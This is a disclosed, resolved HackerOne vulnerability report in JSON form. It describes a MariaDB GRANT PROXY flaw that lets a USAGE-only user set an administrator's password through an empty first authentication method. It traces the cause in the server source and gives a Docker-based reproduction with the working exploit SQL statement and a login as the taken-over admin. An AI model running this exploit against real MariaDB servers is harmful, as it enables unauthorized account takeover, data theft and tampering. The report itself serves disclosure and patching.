@@ -1,0 +1,160 @@
+{
+  "id": 3876430,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODc2NDMw",
+  "url": "https://hackerone.com/reports/3876430",
+  "title": "MariaDB GRANT PROXY permits unauthorized authentication changes and administrator account takeover",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2026-07-20T13:51:57.709Z",
+  "submitted_at": "2026-07-20T13:51:58.296Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "kevin_mizu",
+    "url": "/kevin_mizu",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/3g3r1a74eyyvfd804ufrlp9mifzt/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8724,
+    "url": "https://hackerone.com/mariadb",
+    "handle": "mariadb",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MariaDB",
+      "twitter_handle": "mariadb_org",
+      "website": "https://mariadb.org",
+      "about": "MariaDB is a high performance, open source database that helps the world's busiest websites deliver more content, faster."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-09-07T20:07:40.277Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-09-07T20:07:40.071Z",
+  "team_member_agreed_on_going_public_at": "2026-09-07T19:57:37.241Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "An authenticated MariaDB user with only `USAGE ON *.*` can change the password of an existing administrator through the grantee clause of `GRANT PROXY`.\n\n```sql\nGRANT PROXY ON 'usage_user'@'%'\nTO 'proof_admin'@'%'\nIDENTIFIED VIA ''\nOR mysql_native_password USING PASSWORD('AttackerChosen-2026');\n```\n\nThe empty first authentication method bypasses the authorization check, while the second method is still stored. The attacker can then log in as `proof_admin` using the chosen password and inherit its existing DBA privileges.\n\nThe attacker does not need `ALTER USER`, `CREATE USER`, access to the `mysql` schema, or an existing PROXY grant. The exact target `user@host` must already exist and must match the attacker's new connection.\n\nTested on MariaDB 12.3.2 and the repository's 13.1.0 build.\n\n## Technical Details\n\nAll source links below are pinned to MariaDB/server commit [`7322a6656a5357b4574b7413493c76ba2fc41f84`](https://github.com/MariaDB/server/commit/7322a6656a5357b4574b7413493c76ba2fc41f84).\n\n[`GRANT PROXY`](https://github.com/MariaDB/server/blob/7322a6656a5357b4574b7413493c76ba2fc41f84/sql/sql_yacc.yy#L18419-L18423) uses the generic [`grant_list`](https://github.com/MariaDB/server/blob/7322a6656a5357b4574b7413493c76ba2fc41f84/sql/sql_yacc.yy#L18672-L18683) grammar. Its [`grant_user`](https://github.com/MariaDB/server/blob/7322a6656a5357b4574b7413493c76ba2fc41f84/sql/sql_yacc.yy#L18701-L18723) and [`auth_expression`](https://github.com/MariaDB/server/blob/7322a6656a5357b4574b7413493c76ba2fc41f84/sql/sql_yacc.yy#L18725-L18736) rules allow `IDENTIFIED BY` and multi-authentication clauses on grantees.\n\nMariaDB permits a user to grant PROXY access on its own identity in [`acl_check_proxy_grant_access()`](https://github.com/MariaDB/server/blob/7322a6656a5357b4574b7413493c76ba2fc41f84/sql/sql_acl.cc#L12267-L12331). Because the `ON` account is `usage_user@%`, the low-privilege caller passes this check and reaches the grantee update code.\n\nBefore changing an existing grantee, [`copy_and_check_auth()`](https://github.com/MariaDB/server/blob/7322a6656a5357b4574b7413493c76ba2fc41f84/sql/sql_acl.cc#L7320-L7334) relies on [`LEX_USER::has_auth()`](https://github.com/MariaDB/server/blob/7322a6656a5357b4574b7413493c76ba2fc41f84/sql/structs.h#L274-L277) to decide whether [`check_alter_user()`](https://github.com/MariaDB/server/blob/7322a6656a5357b4574b7413493c76ba2fc41f84/sql/sql_acl.cc#L4198-L4241) is required:\n\n```cpp\nreturn auth &&\n       (auth->plugin.length || auth->auth_str.length || auth->pwtext.length);\n```\n\n`has_auth()` checks only the first authentication node. When that node is empty, it returns false and MariaDB skips `check_alter_user()`.\n\nThe persistence path behaves differently. [`replace_user_table()`](https://github.com/MariaDB/server/blob/7322a6656a5357b4574b7413493c76ba2fc41f84/sql/sql_acl.cc#L4881-L5003) iterates and stores every authentication node:\n\n```cpp\nfor (USER_AUTH *auth= combo->auth; auth; auth= auth->next)\n  nauth++;\n```\n\nTherefore an empty first node suppresses authorization, while a nonempty second node installs an attacker-controlled password on the existing administrator account. The account's original privileges are preserved.\n\n## Step to Reproduce\n\nRun this only against a disposable container.\n\n### Step 1. Start MariaDB\n\n```bash\ndocker run --rm -d \\\n  --name mariadb-proxy-poc \\\n  -p 127.0.0.1:13306:3306 \\\n  -e MARIADB_ROOT_PASSWORD='LabRoot-2026' \\\n  mariadb:12.3.2\n\nuntil docker exec mariadb-proxy-poc \\\n  mariadb-admin -uroot -p'LabRoot-2026' ping >/dev/null 2>&1; do\n  sleep 1\ndone\n```\n\n{F6286848}\n\n### Step 2. Create the accounts\n\n```bash\ndocker exec mariadb-proxy-poc \\\n  mariadb -uroot -p'LabRoot-2026' -e \"\n    CREATE USER 'usage_user'@'%'\n      IDENTIFIED BY 'UsagePassword-2026';\n    GRANT USAGE ON *.* TO 'usage_user'@'%';\n\n    CREATE USER 'proof_admin'@'%'\n      IDENTIFIED BY 'OriginalAdminPassword-2026';\n    GRANT ALL PRIVILEGES ON *.*\n      TO 'proof_admin'@'%' WITH GRANT OPTION;\n  \"\n```\n\n{F6286849}\n\n### Step 3. Trigger the bug as the USAGE-only user\n\n```bash\ndocker exec mariadb-proxy-poc \\\n  mariadb --protocol=tcp -h127.0.0.1 \\\n  -uusage_user -p'UsagePassword-2026' -e \"\n    SHOW GRANTS;\n\n    GRANT PROXY ON 'usage_user'@'%'\n    TO 'proof_admin'@'%'\n    IDENTIFIED VIA ''\n    OR mysql_native_password USING PASSWORD('AttackerChosen-2026');\n  \"\n```\n\nThe statement succeeds even though `usage_user` has only `USAGE`.\n\n{F6286850}\n\n### Step 4. Log in with the injected administrator password\n\n```bash\ndocker exec mariadb-proxy-poc \\\n  mariadb --protocol=tcp -h127.0.0.1 \\\n  -uproof_admin -p'AttackerChosen-2026' -e \"\n    SELECT CURRENT_USER();\n    SHOW GRANTS;\n    CREATE DATABASE proxy_takeover_proof;\n  \"\n```\n\nExpected result: `CURRENT_USER()` is `proof_admin@%`, its original DBA grants remain present, and database creation succeeds.\n\n{F6286851}\n\n### Step 5. Cleanup\n\n```bash\ndocker stop mariadb-proxy-poc\n```\n\n## Impact\n\nA USAGE-only user can take over a known, reachable administrator account and obtain its existing DBA privileges. This can allow reading or modifying databases, creating users, granting privileges, changing server settings, and disrupting the service.",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 6286848,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/qi6zf29cqzgpi6202ut05ig4vi2j?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQ2JOGOQL%2F20260907%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260907T215446Z&X-Amz-Expires=497&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHgaCXVzLXdlc3QtMiJHMEUCIFwMUpTmqUJLhYU8VjdO2EEpaQW29Gtl5Mg7UpHWJ4L7AiEAw%2FmZcwpKNs094Bx9o1XtGuT2CF8vqKvBok54aNfs2N8qsgUIQRADGgwwMTM2MTkyNzQ4NDkiDH%2BUUulqwStE5JKZLyqPBbHMEiiyz5%2B%2BS%2BUFbcfJvL14j09lEe9AQV3ksO8%2BnPlBv6vm0YFfoZC8xz5sunRJk3ENt9nQvfhD8Dd39sJXf19AY552M7hW3CoNAkWdpLP%2B5wKXa%2FkcalhGPl9TWsAX4yaWa3wfS7sPV%2BR%2FltqTQox%2FJLF8c%2B1kYeD4pS5PxeLFplue9hqzP%2FGbWP32Wc2WL7MtoXWeA%2BOM79BQxHCHe6K4DvO6fnnz8ZWI691ebx575Bsd%2BO6iWizsOalzZGs1XPqVPUmJg55sZN1wTfW15V47FtlS082GIefsV45rEClDuhrDEOQGHT%2BHDapfPBfZ1LuAgPHgIs6qaioR4gnGnHnNRSe8Es9d%2BhJC2Q4w0v87039S0a%2BK7ZeRnEanbzWQv1cKTapRoF8bJc4cBem9XxOE8gaAOdLs%2BsNexTXavTw2pmvsLXCpe3oB%2BZAx0Jb7RN5bw3tSLo7k9%2FiQN%2BlsKltii4POMxadhpU3Y%2B3k%2BkUTymvYXmeWN1i7qkuHDvJBhIcYSuXEqDr%2BtdGp3LY29Il7RUROLhfvfZHICmzRVZ5OUhT2rtEhUin2AACCJ%2BzoHgBe3EtO8zkdvDFAFYbsmgFwG1aEQkUjkBV%2F0OzjlemOr8e5Oyn4jlqtMLRUcXzmY6ep%2FWSfbb6DDZ45VMUdSmaR1i%2Fwh9W4z5O23SKkzvjvR9Xb4x5Nd3nXGiZ0xAYC6oJ57GNEMIJjPuVVaRwCGeY%2FvxwoG13ARk5M53iJo8pe6RFYGTv4Ivb6xr4K7E0KzT0xZTqowJbJDTNIcNSfHivFRmum3i15wbRdegxX58fqkYufBNfZGvW5rf%2B39tIuQ4Yx5xVqInQn2ZM409Xt7T3cdxVo%2FbjXrQLSGu%2FxWiAwwbb71AY6sQFvlRsX5P%2BEZVRlQZ%2Fvu8MiZe51cG0AxhexQ0KXCHBTvUwkB%2FI%2BZMQXSjsYm6lPl3Cqto7XVeKt%2F4jkTMvQBwlz7q%2Bn3Kcj6SNtRR2F2sHgITxG7dxMN0Y4cP7TPWUD8hsFudb6%2Bw%2FR6LICDPYMNjqmHuh1NRJeV%2FoFPp7KMwkdk8yI6emKJ2DT1rRIY4dAF17IAcEA9RtSoSwCVAqoBH4f8XvYCpjpTH9J7lgfdk5xJBw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b5a112cf1e989e353e43b58698122a8e33b08f95696dc60644b2566ac30be554",
+      "file_size": 40566,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 6286849,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/v7d95egdcgrjqb8c9or3suaaqnyo?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQ2JOGOQL%2F20260907%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260907T215446Z&X-Amz-Expires=497&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHgaCXVzLXdlc3QtMiJHMEUCIFwMUpTmqUJLhYU8VjdO2EEpaQW29Gtl5Mg7UpHWJ4L7AiEAw%2FmZcwpKNs094Bx9o1XtGuT2CF8vqKvBok54aNfs2N8qsgUIQRADGgwwMTM2MTkyNzQ4NDkiDH%2BUUulqwStE5JKZLyqPBbHMEiiyz5%2B%2BS%2BUFbcfJvL14j09lEe9AQV3ksO8%2BnPlBv6vm0YFfoZC8xz5sunRJk3ENt9nQvfhD8Dd39sJXf19AY552M7hW3CoNAkWdpLP%2B5wKXa%2FkcalhGPl9TWsAX4yaWa3wfS7sPV%2BR%2FltqTQox%2FJLF8c%2B1kYeD4pS5PxeLFplue9hqzP%2FGbWP32Wc2WL7MtoXWeA%2BOM79BQxHCHe6K4DvO6fnnz8ZWI691ebx575Bsd%2BO6iWizsOalzZGs1XPqVPUmJg55sZN1wTfW15V47FtlS082GIefsV45rEClDuhrDEOQGHT%2BHDapfPBfZ1LuAgPHgIs6qaioR4gnGnHnNRSe8Es9d%2BhJC2Q4w0v87039S0a%2BK7ZeRnEanbzWQv1cKTapRoF8bJc4cBem9XxOE8gaAOdLs%2BsNexTXavTw2pmvsLXCpe3oB%2BZAx0Jb7RN5bw3tSLo7k9%2FiQN%2BlsKltii4POMxadhpU3Y%2B3k%2BkUTymvYXmeWN1i7qkuHDvJBhIcYSuXEqDr%2BtdGp3LY29Il7RUROLhfvfZHICmzRVZ5OUhT2rtEhUin2AACCJ%2BzoHgBe3EtO8zkdvDFAFYbsmgFwG1aEQkUjkBV%2F0OzjlemOr8e5Oyn4jlqtMLRUcXzmY6ep%2FWSfbb6DDZ45VMUdSmaR1i%2Fwh9W4z5O23SKkzvjvR9Xb4x5Nd3nXGiZ0xAYC6oJ57GNEMIJjPuVVaRwCGeY%2FvxwoG13ARk5M53iJo8pe6RFYGTv4Ivb6xr4K7E0KzT0xZTqowJbJDTNIcNSfHivFRmum3i15wbRdegxX58fqkYufBNfZGvW5rf%2B39tIuQ4Yx5xVqInQn2ZM409Xt7T3cdxVo%2FbjXrQLSGu%2FxWiAwwbb71AY6sQFvlRsX5P%2BEZVRlQZ%2Fvu8MiZe51cG0AxhexQ0KXCHBTvUwkB%2FI%2BZMQXSjsYm6lPl3Cqto7XVeKt%2F4jkTMvQBwlz7q%2Bn3Kcj6SNtRR2F2sHgITxG7dxMN0Y4cP7TPWUD8hsFudb6%2Bw%2FR6LICDPYMNjqmHuh1NRJeV%2FoFPp7KMwkdk8yI6emKJ2DT1rRIY4dAF17IAcEA9RtSoSwCVAqoBH4f8XvYCpjpTH9J7lgfdk5xJBw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fa8ad64167057f30cb3a1b25a50b1f9cd8bd4b4cf47cb15c2f2b1d1c2be006ee",
+      "file_size": 44994,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 6286850,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2i3xmm6eaocuq60dxh0fk21tn5fh?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQ2JOGOQL%2F20260907%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260907T215446Z&X-Amz-Expires=497&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHgaCXVzLXdlc3QtMiJHMEUCIFwMUpTmqUJLhYU8VjdO2EEpaQW29Gtl5Mg7UpHWJ4L7AiEAw%2FmZcwpKNs094Bx9o1XtGuT2CF8vqKvBok54aNfs2N8qsgUIQRADGgwwMTM2MTkyNzQ4NDkiDH%2BUUulqwStE5JKZLyqPBbHMEiiyz5%2B%2BS%2BUFbcfJvL14j09lEe9AQV3ksO8%2BnPlBv6vm0YFfoZC8xz5sunRJk3ENt9nQvfhD8Dd39sJXf19AY552M7hW3CoNAkWdpLP%2B5wKXa%2FkcalhGPl9TWsAX4yaWa3wfS7sPV%2BR%2FltqTQox%2FJLF8c%2B1kYeD4pS5PxeLFplue9hqzP%2FGbWP32Wc2WL7MtoXWeA%2BOM79BQxHCHe6K4DvO6fnnz8ZWI691ebx575Bsd%2BO6iWizsOalzZGs1XPqVPUmJg55sZN1wTfW15V47FtlS082GIefsV45rEClDuhrDEOQGHT%2BHDapfPBfZ1LuAgPHgIs6qaioR4gnGnHnNRSe8Es9d%2BhJC2Q4w0v87039S0a%2BK7ZeRnEanbzWQv1cKTapRoF8bJc4cBem9XxOE8gaAOdLs%2BsNexTXavTw2pmvsLXCpe3oB%2BZAx0Jb7RN5bw3tSLo7k9%2FiQN%2BlsKltii4POMxadhpU3Y%2B3k%2BkUTymvYXmeWN1i7qkuHDvJBhIcYSuXEqDr%2BtdGp3LY29Il7RUROLhfvfZHICmzRVZ5OUhT2rtEhUin2AACCJ%2BzoHgBe3EtO8zkdvDFAFYbsmgFwG1aEQkUjkBV%2F0OzjlemOr8e5Oyn4jlqtMLRUcXzmY6ep%2FWSfbb6DDZ45VMUdSmaR1i%2Fwh9W4z5O23SKkzvjvR9Xb4x5Nd3nXGiZ0xAYC6oJ57GNEMIJjPuVVaRwCGeY%2FvxwoG13ARk5M53iJo8pe6RFYGTv4Ivb6xr4K7E0KzT0xZTqowJbJDTNIcNSfHivFRmum3i15wbRdegxX58fqkYufBNfZGvW5rf%2B39tIuQ4Yx5xVqInQn2ZM409Xt7T3cdxVo%2FbjXrQLSGu%2FxWiAwwbb71AY6sQFvlRsX5P%2BEZVRlQZ%2Fvu8MiZe51cG0AxhexQ0KXCHBTvUwkB%2FI%2BZMQXSjsYm6lPl3Cqto7XVeKt%2F4jkTMvQBwlz7q%2Bn3Kcj6SNtRR2F2sHgITxG7dxMN0Y4cP7TPWUD8hsFudb6%2Bw%2FR6LICDPYMNjqmHuh1NRJeV%2FoFPp7KMwkdk8yI6emKJ2DT1rRIY4dAF17IAcEA9RtSoSwCVAqoBH4f8XvYCpjpTH9J7lgfdk5xJBw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e747e2c1efd91b0f489c2cde16e73bc467f92552385a16520eea0f995071077b",
+      "file_size": 52622,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 6286851,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/leuqgaz2rtpbqdxi1g553wi85znp?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQ2JOGOQL%2F20260907%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260907T215446Z&X-Amz-Expires=497&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHgaCXVzLXdlc3QtMiJHMEUCIFwMUpTmqUJLhYU8VjdO2EEpaQW29Gtl5Mg7UpHWJ4L7AiEAw%2FmZcwpKNs094Bx9o1XtGuT2CF8vqKvBok54aNfs2N8qsgUIQRADGgwwMTM2MTkyNzQ4NDkiDH%2BUUulqwStE5JKZLyqPBbHMEiiyz5%2B%2BS%2BUFbcfJvL14j09lEe9AQV3ksO8%2BnPlBv6vm0YFfoZC8xz5sunRJk3ENt9nQvfhD8Dd39sJXf19AY552M7hW3CoNAkWdpLP%2B5wKXa%2FkcalhGPl9TWsAX4yaWa3wfS7sPV%2BR%2FltqTQox%2FJLF8c%2B1kYeD4pS5PxeLFplue9hqzP%2FGbWP32Wc2WL7MtoXWeA%2BOM79BQxHCHe6K4DvO6fnnz8ZWI691ebx575Bsd%2BO6iWizsOalzZGs1XPqVPUmJg55sZN1wTfW15V47FtlS082GIefsV45rEClDuhrDEOQGHT%2BHDapfPBfZ1LuAgPHgIs6qaioR4gnGnHnNRSe8Es9d%2BhJC2Q4w0v87039S0a%2BK7ZeRnEanbzWQv1cKTapRoF8bJc4cBem9XxOE8gaAOdLs%2BsNexTXavTw2pmvsLXCpe3oB%2BZAx0Jb7RN5bw3tSLo7k9%2FiQN%2BlsKltii4POMxadhpU3Y%2B3k%2BkUTymvYXmeWN1i7qkuHDvJBhIcYSuXEqDr%2BtdGp3LY29Il7RUROLhfvfZHICmzRVZ5OUhT2rtEhUin2AACCJ%2BzoHgBe3EtO8zkdvDFAFYbsmgFwG1aEQkUjkBV%2F0OzjlemOr8e5Oyn4jlqtMLRUcXzmY6ep%2FWSfbb6DDZ45VMUdSmaR1i%2Fwh9W4z5O23SKkzvjvR9Xb4x5Nd3nXGiZ0xAYC6oJ57GNEMIJjPuVVaRwCGeY%2FvxwoG13ARk5M53iJo8pe6RFYGTv4Ivb6xr4K7E0KzT0xZTqowJbJDTNIcNSfHivFRmum3i15wbRdegxX58fqkYufBNfZGvW5rf%2B39tIuQ4Yx5xVqInQn2ZM409Xt7T3cdxVo%2FbjXrQLSGu%2FxWiAwwbb71AY6sQFvlRsX5P%2BEZVRlQZ%2Fvu8MiZe51cG0AxhexQ0KXCHBTvUwkB%2FI%2BZMQXSjsYm6lPl3Cqto7XVeKt%2F4jkTMvQBwlz7q%2Bn3Kcj6SNtRR2F2sHgITxG7dxMN0Y4cP7TPWUD8hsFudb6%2Bw%2FR6LICDPYMNjqmHuh1NRJeV%2FoFPp7KMwkdk8yI6emKJ2DT1rRIY4dAF17IAcEA9RtSoSwCVAqoBH4f8XvYCpjpTH9J7lgfdk5xJBw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8a0b84f8a2c50e3ed4400b3985a3933fccdad1ba3626027feecbec2a55555940",
+      "file_size": 61350,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-10-07T19:57:37.525Z",
+  "allow_singular_disclosure_after": 2584971.008791284,
+  "singular_disclosure_allowed": false,
+  "vote_count": 2,
+  "voters": [
+    "kapeka",
+    "al-theeb"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.8,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 10335,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "MariaDB Server & Connectors - Access control bypass",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
